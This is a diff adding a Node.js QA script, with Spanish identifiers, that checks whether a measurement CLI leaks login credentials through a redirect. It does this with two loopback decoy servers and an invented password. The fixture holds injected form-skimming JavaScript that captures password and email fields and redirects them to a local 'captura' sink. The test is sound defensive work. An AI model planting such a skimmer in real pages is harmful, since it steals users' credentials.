@@ -1,0 +1,34 @@
+const fs=require('node:fs'),path=require('node:path'),http=require('node:http'),cp=require('node:child_process');
+const ROOT='C:/WedJaiseReact',ACCOUNTS='C:/Users/jdeos/AppData/Local/Temp/claude/c--WedJaiseReact/4cc4d69e-333e-461c-81a6-816527437289/scratchpad/cuentas-f5.json';
+const listen=s=>new Promise(r=>s.listen(0,'127.0.0.1',()=>r(s.address().port)));
+const close=s=>new Promise(r=>{s.closeAllConnections?.();s.close(r)});
+async function main(){
+  const actual=JSON.parse(fs.readFileSync(ACCOUNTS));
+  const fakePassword='CLAVE_INVENTADA_REDIRECT_10A';
+  const fake=Object.fromEntries(['admin','clienteA'].map(k=>[k,{email:actual[k].email,id:actual[k].id,password:fakePassword}]));
+  const file=path.join(__dirname,'cuentas-password-inventada.json');fs.writeFileSync(file,JSON.stringify(fake));
+  const hits=[];
+  const sink=http.createServer((req,res)=>{
+    const u=new URL(req.url,'http://x');hits.push({method:req.method,path:u.pathname,recibioClaveInventada:u.searchParams.get('clave')===fakePassword,recibioCorreoQAFicticio:u.searchParams.get('email')===actual.admin.email});
+    res.writeHead(200,{'Access-Control-Allow-Origin':'*'});res.end('OK QA');
+  });const target=await listen(sink);
+  const js='var u=`http://127.0.0.1:54321`,v=u.startsWith(`/`)?location.origin+u:u;\ndocument.addEventListener("DOMContentLoaded",()=>{document.querySelector("form").addEventListener("submit",e=>{e.preventDefault();fetch("/assets/rebote?clave="+encodeURIComponent(document.querySelector("#password").value)+"&email="+encodeURIComponent(document.querySelector("#email").value)).finally(()=>history.pushState({},"","/inicio"));});});';
+  const html='<html><body><form><input id="email"><input id="password" type="password"><button type="submit">Entrar</button></form><script type="module" src="/assets/guardia.js"></script></body></html>';
+  const app=http.createServer((req,res)=>{
+    const u=new URL(req.url,'http://x');
+    if(u.pathname==='/assets/rebote'){res.writeHead(302,{Location:`http://127.0.0.1:${target}/captura${u.search}`});res.end();return;}
+    if(u.pathname==='/assets/guardia.js'){res.writeHead(200,{'Content-Type':'application/javascript'});res.end(js);return;}
+    if(u.pathname==='/sw.js'){res.writeHead(404);res.end();return;}
+    res.writeHead(200,{'Content-Type':'text/html'});res.end(html);
+  });const port=await listen(app);
+  try{
+    const {code,text}=await new Promise(r=>{
+      const p=cp.spawn(process.execPath,[ROOT+'/scripts/fase10a/medir-vitales-10a.cjs','--app=http://127.0.0.1:'+port,'--cuentas='+file,'--muestras=1','--salida='+__dirname+'/medidor-negativo-redirect.json'],{cwd:ROOT});let text='';p.stdout.on('data',b=>text+=b);p.stderr.on('data',b=>text+=b);p.once('close',code=>r({code,text}));
+    });
+    fs.writeFileSync(__dirname+'/medidor-negativo-redirect.log',text);
+    const output=JSON.parse(fs.readFileSync(__dirname+'/medidor-negativo-redirect.json'));
+    const report={fecha:new Date().toISOString(),cliReal:'scripts/fase10a/medir-vitales-10a.cjs',exit:code,preflight:output.preflight,violaciones:output.guarda?.violaciones,completo:output.completo,peticionesSenuelo:hits,defectoReproducido:hits.some(h=>h.recibioClaveInventada),limite:'CLI original sin modificar. Contraseña inventada, correos/ids QA Local y dos servidores señuelo de loopback. Solo lecturas de Docker/psql; no autenticación real, alta de usuarios ni red externa. El código 2 se produce después de que el señuelo haya recibido la clave inventada.'};
+    fs.writeFileSync(__dirname+'/login-redirect-runtime.json',JSON.stringify(report,null,2));console.log(JSON.stringify(report,null,2));
+  }finally{await close(app);await close(sink);}
+}
+main().catch(e=>{console.error(e);process.exitCode=1;});
